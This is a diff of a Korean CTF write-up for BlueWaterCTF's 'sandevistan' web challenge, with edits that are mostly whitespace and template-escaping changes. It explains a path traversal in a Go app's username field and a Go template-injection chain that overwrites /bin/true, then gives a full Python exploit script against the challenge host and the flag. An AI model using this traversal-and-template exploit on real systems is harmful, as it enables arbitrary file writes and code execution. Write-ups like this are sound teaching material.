@@ -5,28 +5,28 @@ description: CTF Write-up
 tags: BlueWaterCTF     
 category: ctf 
 ---   
-     
+	 
 # BlueWaterCTF
 
 ## 대회 일정
 **2024-10-12 23:00 ~ 2024-10-14 11:00**     
-    
+	
 ## 대회 후기          
-      
+	  
 <img src="/assets/images/ctf/2024/bluewater/scoreboard.jpg" width=700px>        
-    
+	
 화이트햇 준비도 할겸 오랜만에 CTF 대회를 참가했다. 13일 저녁에 시작했는데 웹 솔브가 많이나지 않은 것을 보고 배워갈 게 많은 대회라고 생각하고 임했다. 루비야랩 팀으로 나가게 되었고 웹은 총 5문제가 나왔는데 그 중 1문제를 풀었다.                 
-               
+			   
 ## Writeup     
-     
+	 
 - <a href="#sandevistan">sandevistan</a>      
-     
+	 
 <a id="sandevistan"></a>          
 
 # sandevistan              
-     
+	 
 32 solved / 212 pts     
-    
+	
 ```go
 func (s *Server) Serve() error {
 	r := mux.NewRouter()
@@ -38,7 +38,7 @@ func (s *Server) Serve() error {
 	r.HandleFunc("/cyberware", s.cwHandlePost).Methods("POST")
 	r.HandleFunc("/user", s.handleUserGet).Methods("GET")
 	r.HandleFunc("/user", s.handleUserPost).Methods("POST")
-    return http.ListenAndServe(":8080", r)
+	return http.ListenAndServe(":8080", r)
 }
 ```    
    
@@ -106,7 +106,7 @@ func (s *Server) handleUserGet(w http.ResponseWriter, r *http.Request) {
 	utils.RenderTemplate(w, "/tmpl/user", u)
 }
 ```      
-    
+	
 `/user` 엔드포인트 쪽 코드를 보면, POST 요청을 보내 새로운 유저를 생성할 수 있고, GET 요청을 통해 유저 프로필에 접근이 가능하다.    
 
 ```go
@@ -194,7 +194,7 @@ func (s *Server) cwHandlePost(w http.ResponseWriter, r *http.Request){
 	http.Redirect(w, r, "/cyberware", http.StatusFound)
 }
 ```  
-         
+		 
 `/cyberware` POST 요청을 보내면, `checkForm()` 함수를 거쳐 `AlphaNumCheck()` 함수가 호출된다.        
 
 ```go
@@ -222,11 +222,11 @@ func ErrorFactory(ctx context.Context, v string, f string) *models.UserError {
 	return UErr
 }
 ```           
-    
+	
 `AlphaNumCheck()` 함수에서 `username`을 정규표현식을 통해 검증한다. 하지만, 정규표현식에 매칭되지 않는 문자가 포함될 경우 에러를 발생시켜 `errorlog` 디렉터리에 에러 로그 파일을 생성하고 `ERROR! Invalid Value: %s` 내용을 저장한다.       
 
 하지만, `username`에대해 Path Traversal 검증이 이루어지고 있지 않아 원하는 경로에 원하는 파일을 쓸 수 있게 된다.   
-      
+	  
 ```go
 package models
 
@@ -273,7 +273,7 @@ func (u *User) NewError(val string, fname string) *UserError {
 }
 
 func (u *User) SerializeErrors(data string, index int, offset int64) error {
- 	fname := u.Errors[index]
+	fname := u.Errors[index]
 
 	if fname == nil {
 		return errors.New("Error not found")
@@ -296,15 +296,15 @@ func (u *User) SerializeErrors(data string, index int, offset int64) error {
 func (u *User) UserHealthcheck() ([]byte, error) {
 	cmd := exec.Command("/bin/true")	
 	output, err := cmd.CombinedOutput()
-    if err != nil {
+	if err != nil {
 		return nil, errors.New("error in healthcheck")
-        panic(err)
-    }
+		panic(err)
+	}
 	return output, nil
 }
 ```            
 `models/user.go` 파일에서 `UserHealthcheck()` 메서드에서 `/bin/true`를 실행하는 것을 확인할 수 있었고, `/bin/true` 파일을 Overwrite 하도록 시도했다. 하지만, `ERROR! Invalid Value: ` 문자가 포함되어있어 실행 파일 포맷 형식에 맞지 않아 에러가 발생한다.     
-     
+	 
 ```go
 func (u *User) NewError(val string, fname string) *UserError {
 	ctx := context.Background()
@@ -318,7 +318,7 @@ func (u *User) NewError(val string, fname string) *UserError {
 }
 
 func (u *User) SerializeErrors(data string, index int, offset int64) error {
- 	fname := u.Errors[index]
+	fname := u.Errors[index]
 
 	if fname == nil {
 		return errors.New("Error not found")
@@ -347,8 +347,8 @@ func (u *User) SerializeErrors(data string, index int, offset int64) error {
 import requests
 
 def binary_to_hex_string(binary_data):
-    hex_string = ''.join(f'\\x{byte:02x}' for byte in binary_data)
-    return hex_string
+	hex_string = ''.join(f'\\x{byte:02x}' for byte in binary_data)
+	return hex_string
 
 binary_data = open("readflag","rb").read()  
 hex_representation = binary_to_hex_string(binary_data)
@@ -357,53 +357,53 @@ hex_representation = binary_to_hex_string(binary_data)
 url = "http://sandevistan.chal.perfect.blue:28945"
 
 r = requests.post(
-    f"{url}/user", 
-    data={
-        "username": "asdf",
-    }
+	f"{url}/user", 
+	data={
+		"username": "asdf",
+	}
 )
 print(r.status_code)
 print(r.text)
 
 r = requests.post(
-    f"{url}/cyberware", 
-    data={
-        "username": "../../../../../../../app/tmpl/user.html", # 경로
-        "name": b"""
+	f"{url}/cyberware", 
+	data={
+		"username": "../../../../../../../app/tmpl/user.html", # 경로
+		"name": b"""
 <!DOCTYPE html>
-    <head>
-        <link rel="stylesheet" href="static/css/style.css">
-        <!-- cool cyberpunk theme from gwannon: https://github.com/gwannon/Cyberpunk-2077-theme-css -->
-    </head>
-    <body>
-        <h2 class="cyberpunk glitched">Hello {{.Name}}!</h1>
-        <h3 class="cyberpunk glitched">Here are your cyberwares.</h2>
-        <hr />
-
-        <div class="cyberwares">
-            {{.NewError "xxxxx" "/bin/true"}}
-            {{.SerializeErrors \""""+ hex_representation.encode() +b"""\" 0 0}}
-            {{.UserHealthcheck}}
-        </div>
-
-    </body>
+	<head>
+		<link rel="stylesheet" href="static/css/style.css">
+		<!-- cool cyberpunk theme from gwannon: https://github.com/gwannon/Cyberpunk-2077-theme-css -->
+	</head>
+	<body>
+		<h2 class="cyberpunk glitched">Hello {{.Name}}!</h1>
+		<h3 class="cyberpunk glitched">Here are your cyberwares.</h2>
+		<hr />
+		{% raw %}
+		<div class="cyberwares">
+			{{.NewError "xxxxx" "/bin/true"}}
+			{{.SerializeErrors \""""+ hex_representation.encode() +b"""\" 0 0}}
+			{{.UserHealthcheck}}
+		</div>
+		{% endraw %}
+	</body>
 </html>
 """# 내용
-    }
+	}
 )
 print(r.status_code)
 print(r.text)
 
 r = requests.get(
-    f"{url}/user", 
-    params={
-        "username": "asdf",
-    }
+	f"{url}/user", 
+	params={
+		"username": "asdf",
+	}
 )
 print(r.status_code)
 print(r.text)
 ```     
-     
+	 
 ### Flag     
 bwctf{YoU_kNoW_yOu_d1dnt_l0s3_Ur_53Lf-coNtR0L._LEt'5_start_at_the_r4inB0w}     
-     
+	 
